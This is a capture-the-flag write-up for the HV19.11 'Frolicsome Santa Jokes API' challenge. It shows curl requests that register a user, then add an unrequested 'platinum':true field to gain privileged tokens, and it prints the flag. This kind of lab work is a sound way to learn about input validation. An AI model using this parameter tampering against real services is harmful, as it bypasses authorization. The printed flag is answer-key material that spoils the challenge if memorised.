

# HV19.11 Frolicsome Santa Jokes API

**Task:** The elves created an API where you get random jokes about santa. 

Go and try it here: [http://whale.hacking-lab.com:10101](http://whale.hacking-lab.com:10101/)

**Flag:** `HV19{th3_cha1n_1s_0nly_as_str0ng_as_th3_w3ak3st_l1nk}`

# Research

Let's register like the API instructs us to:

```bash
$ curl -s -X POST -H 'Content-Type: application/json' http://whale.hacking-lab.com:10101/fsja/login --data '{"username":"testuser", "password": "passwordpassword"}'
{"message":"Token generated","code":201,"token":"eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjp7InVzZXJuYW1lIjoidGVzdHVzZXIiLCJwbGF0aW51bSI6ZmFsc2V9LCJleHAiOjE1NzYwOTM2NzQuODc2MDAwMDAwfQ.8_oDtf3wz1sr2s-jQbEEKRMk2UgH3hHBeurYWXzGPVk"}% 
```

Give me some jokes!

``` bash
$ curl -X GET "http://whale.hacking-lab.com:10101/fsja/random?token=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjp7InVzZXJuYW1lIjoidGVzdHVzZXIiLCJwbGF0aW51bSI6ZmFsc2V9LCJleHAiOjE1NzYwOTM2NzQuODc2MDAwMDAwfQ.8_oDtf3wz1sr2s-jQbEEKRMk2UgH3hHBeurYWXzGPVk"

{"joke":"Christmas is a time when kids tell Santa what they want and adults pay for it. Deficits are when adults tell the government what they want and their kids pay for it","author":"Richard Lamm","platinum":false}%  
```

That `platinum` field in the answer is so suspicious like hopper disguised as Santa Claus (the ears!). Let's see if we can set the value to `true` when we register for our token: 

```bash
$ curl -s -X POST -H 'Content-Type: application/json' http://whale.hacking-lab.com:10101/fsja/login --data '{"username":"rudolf", "password": "passwordpassword", "platinum":true}'
{"message":"Token generated","code":201,"token":"eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjp7InVzZXJuYW1lIjoiZ29vZ2xpZXMiLCJwbGF0aW51bSI6dHJ1ZX0sImV4cCI6MTU3NjA5NzEzOC41MDMwMDAwMDB9.6oW6bd4_SaEUtq-UU03rIHeeg_otLV0D_iSpMO1VFSc"}%    
```

Indeed we can!

```bash
curl -X GET "http://whale.hacking-lab.com:10101/fsja/random?token=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjp7InVzZXJuYW1lIjoiZ29vZ2xpZXMiLCJwbGF0aW51bSI6dHJ1ZX0sImV4cCI6MTU3NjA5NzEzOC41MDMwMDAwMDB9.6oW6bd4_SaEUtq-UU03rIHeeg_otLV0D_iSpMO1VFSc"
{"joke":"Congratulation! Sometimes bugs are rather stupid. But that's how it happens, sometimes. Doing all the crypto stuff right and forgetting the trivial stuff like input validation, Hohoho! Here's your flag: HV19{th3_cha1n_1s_0nly_as_str0ng_as_th3_w3ak3st_l1nk}","author":"Santa","platinum":true}%
```

